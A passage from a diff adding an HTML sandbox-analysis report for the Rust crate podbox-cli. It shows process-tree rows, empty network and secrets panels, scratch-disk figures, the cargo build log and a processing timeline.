+<td class="nowrap">7 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 2222: /work/target/debug/build/podbox-cli-407fcee0df399a29/build-script-build">podbox-cli</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">1 min 6 s</td>
+<td class="nowrap">2 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-unknown">
+<td class="d2"><span class="branch">└</span><span class="badge role">unknown</span> <span class="mono" title="pid 2223: "></span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">1 min 6 s</td>
+<td class="nowrap">0 ms</td>
+<td class="nowrap">32512</td>
+</tr>
+
+</tbody>
+</table>
+</div>
+
+
+</div>
+
+<div class="panel">
+<h3>Network <span class="muted">0</span></h3>
+
+<p class="muted">No network activity.</p>
+
+</div>
+
+<div class="panel">
+<h3>Files <span class="muted">0</span></h3>
+<h4>Secrets opened</h4>
+<p class="muted">None.</p>
+<h4>Written outside the build directories</h4>
+<p class="muted">None.</p>
+
+</div>
+
+<div class="panel">
+<h3>Scratch disk <span class="muted">0</span></h3>
+
+<dl class="facts">
+<div><dt>Files</dt><dd>1453</dd></div><div><dt>Directories</dt><dd>316</dd></div><div><dt>Size</dt><dd>495.5 MiB</dd></div><div><dt>Compiled units</dt><dd>213</dd></div>
+</dl>
+<p class="muted">Nothing outside the build areas.</p>
+
+</div>
+
+<div class="panel">
+<h3>Output</h3>
+
+<details><summary>Standard error</summary><pre>   Compiling proc-macro2 v1.0.107
+   Compiling quote v1.0.47
+   Compiling unicode-ident v1.0.27
+   Compiling syn v3.0.9
+   Compiling serde_core v1.0.229
+   Compiling serde v1.0.229
+   Compiling serde_derive v1.0.229
+   Compiling libc v0.2.191
+   Compiling syn v2.0.119
+    Checking pin-project-lite v0.2.17
+   Compiling synstructure v0.14.0
+    Checking cfg-if v1.0.5
+   Compiling zerofrom-derive v0.1.8
+    Checking zerofrom v0.1.8
+   Compiling yoke-derive v0.8.4
+    Checking parking v2.2.1
+    Checking stable_deref_trait v1.2.1
+    Checking bitflags v2.13.2
+    Checking yoke v0.8.4
+   Compiling autocfg v1.5.1
+   Compiling winnow v1.0.4
+   Compiling zerovec-derive v0.11.7
+    Checking fastrand v2.5.0
+   Compiling crossbeam-utils v0.8.23
+   Compiling hashbrown v0.17.1
+   Compiling rustix v1.1.5
+   Compiling equivalent v1.0.3
+   Compiling indexmap v2.14.2
+    Checking zerovec v0.11.9
+   Compiling toml_parser v1.1.5+spec-1.1.0
+   Compiling displaydoc v0.2.7
+    Checking once_cell v1.21.4
+   Compiling toml_datetime v1.1.2+spec-1.1.0
+    Checking linux-raw-sys v0.12.1
+   Compiling toml_edit v0.25.17+spec-1.1.0
+   Compiling enumflags2_derive v0.7.12
+    Checking concurrent-queue v2.5.0
+   Compiling proc-macro-crate v3.5.0
+   Compiling zvariant_utils v4.2.0
+    Checking event-listener v5.4.2
+    Checking event-listener-strategy v0.5.4
+   Compiling zvariant_derive v5.15.1
+    Checking futures-lite v2.6.1
+    Checking tinystr v0.8.5
+    Checking errno v0.3.14
+    Checking litemap v0.8.3
+    Checking writeable v0.6.4
+   Compiling version_check v0.9.5
+   Compiling generic-array v0.14.7
+    Checking icu_locale_core v2.4.0
+    Checking signal-hook-registry v1.4.8
+    Checking tracing-core v0.1.36
+    Checking zerotrie v0.2.5
+    Checking potential_utf v0.1.6
+   Compiling async-io v2.6.0
+    Checking utf8_iter v1.0.4
+    Checking slab v0.4.12
+   Compiling icu_normalizer_data v2.4.0
+   Compiling icu_properties_data v2.4.0
+    Checking smallvec v1.16.4
+    Checking icu_collections v2.4.0
+    Checking icu_provider v2.4.0
+   Compiling enumflags2 v0.7.12
+    Checking polling v3.11.0
+   Compiling zcheapstr v1.1.0
+   Compiling tracing-attributes v0.1.31
+   Compiling endi v1.1.1
+   Compiling heck v0.5.0
+    Checking async-task v4.7.1
+    Checking utf8parse v0.2.2
+    Checking typenum v1.20.1
+    Checking anstyle-parse v1.0.0
+   Compiling zvariant v5.15.1
+    Checking tracing v0.1.44
+    Checking async-channel v2.5.0
+   Compiling memoffset v0.9.1
+    Checking thread_local v1.1.10
+    Checking regex-syntax v0.8.11
+    Checking log v0.4.34
+   Compiling cfg_aliases v0.2.2
+   Compiling zmij v1.0.23
+    Checking is_terminal_polyfill v1.70.2
+    Checking anstyle-query v1.1.5
+   Compiling getrandom v0.4.3
+    Checking anstyle v1.0.14
+    Checking atomic-waker v1.1.2
+    Checking colorchoice v1.0.5
+    Checking anstream v1.0.0
+    Checking piper v0.2.5
+   Compiling nix v0.31.3
+    Checking regex-automata v0.4.18
+    Checking icu_properties v2.4.0
+    Checking icu_normalizer v2.4.0
+    Checking async-signal v0.2.14
+   Compiling zbus_names v4.3.5
+    Checking async-lock v3.4.2
+   Compiling rustix v0.38.44
+   Compiling signal-hook v0.4.5
+    Checking clap_lex v1.1.1
+   Compiling thiserror v1.0.69
+    Checking strsim v0.11.1
+    Checking lazy_static v1.5.1
+    Checking is_ci v1.2.0
+   Compiling serde_json v1.0.154
+    Checking sharded-slab v0.1.7
+    Checking clap_builder v4.6.7
+    Checking async-process v2.5.0
+   Compiling zbus_macros v5.19.0
+    Checking idna_adapter v1.2.2
+    Checking matchers v0.2.0
+    Checking blocking v1.7.0
+    Checking tracing-log v0.2.0
+    Checking crypto-common v0.1.7
+    Checking block-buffer v0.10.4
+    Checking async-executor v1.14.0
+   Compiling clap_derive v4.6.7
+    Checking async-broadcast v0.7.2
+    Checking ordered-stream v0.2.0
+    Checking serde_spanned v0.6.9
+    Checking toml_datetime v0.6.11
+    Checking uuid v1.29.0
+   Compiling thiserror-impl v1.0.69
+    Checking is-terminal v0.4.17
+   Compiling serde_repr v0.1.21
+   Compiling async-recursion v1.2.0
+   Compiling async-trait v0.1.92
+    Checking option-ext v0.2.0
+    Checking unicode-width v0.2.2
+    Checking winnow v0.7.15
+    Checking toml_write v0.1.2
+   Compiling anyhow v1.0.104
+    Checking linux-raw-sys v0.4.15
+    Checking itoa v1.0.18
+    Checking nu-ansi-term v0.50.3
+    Checking percent-encoding v2.3.2
+    Checking hex v0.4.3
+   Compiling thiserror v2.0.21
+    Checking zbus v5.19.0
+    Checking form_urlencoded v1.2.2
+    Checking tracing-subscriber v0.3.23
+    Checking toml_edit v0.22.27
+    Checking console v0.15.11
+    Checking dirs-sys v0.4.1
+    Checking supports-color v2.1.0
+    Checking clap v4.6.7
+    Checking digest v0.10.7
+    Checking tempfile v3.27.0
+    Checking idna v1.1.0
+    Checking supports-color v3.0.2
+    Checking fuzzy-matcher v0.3.7
+   Compiling strum_macros v0.27.2
+   Compiling thiserror-impl v2.0.21
+    Checking either v1.19.0
+    Checking home v0.5.12
+   Compiling podbox-cli v0.9.1
+    Checking shell-words v1.1.1
+    Checking cpufeatures v0.2.17
+    Checking zeroize v1.9.1
+    Checking dialoguer v0.11.0
+    Checking sha2 v0.10.9
+    Checking which v6.0.3
+    Checking strum v0.27.2
+    Checking owo-colors v4.4.0
+    Checking podbox-protocol v0.9.1
+    Checking url v2.5.8
+    Checking clap_complete v4.6.11
+    Checking dirs v5.0.1
+    Checking toml v0.8.23
+    Checking tracing-journald v0.3.2
+    Checking notify-rust v4.18.2
+    Checking crateward-probe v0.0.0 (/cw/probe)
+    Finished `dev` profile [unoptimized + debuginfo] target(s) in 1m 11s
+</pre></details>
+
+</div>
+</section>
+
+
+<details class="section" id="timeline">
+<summary><h2>Timeline</h2> <span class="count">6</span></summary>
+<table>
+<thead><tr><th>When</th><th>From</th><th>To</th><th>Event</th><th>Worker</th></tr></thead>
+<tbody>
+
+<tr><td class="muted nowrap">2026-10-25 14:22 UTC</td><td class="nowrap">Discovered</td><td class="nowrap">Fetched</td><td>fetched</td><td class="muted">fetcher-12688</td></tr>
+
+<tr><td class="muted nowrap">2026-10-25 14:22 UTC</td><td class="nowrap">Fetched</td><td class="nowrap">ReadyForSandbox</td><td>static_analysis_completed</td><td class="muted">static-12726</td></tr>
+
+<tr><td class="muted nowrap">2026-10-25 14:22 UTC</td><td class="nowrap">ReadyForSandbox</td><td class="nowrap">Running</td><td>sandbox_started</td><td class="muted">orchestrator-12760-slot0</td></tr>
+
+<tr><td class="muted nowrap">2026-10-25 14:24 UTC</td><td class="nowrap">Running</td><td class="nowrap">DynamicallyAnalyzed</td><td>sandbox_completed</td><td class="muted">orchestrator-12760-slot0</td></tr>
+
+<tr><td class="muted nowrap">2026-10-25 14:24 UTC</td><td class="nowrap">DynamicallyAnalyzed</td><td class="nowrap">Scored</td><td>scored</td><td class="muted">analyzer-12816</td></tr>
+
+<tr><td class="muted nowrap">2026-10-25 14:24 UTC</td><td class="nowrap">Scored</td><td class="nowrap">Done</td><td>finalized</td><td class="muted">analyzer-12816</td></tr>
+
+</tbody>
+</table>
+</details>
+
+</main>
+</body>
+</html>
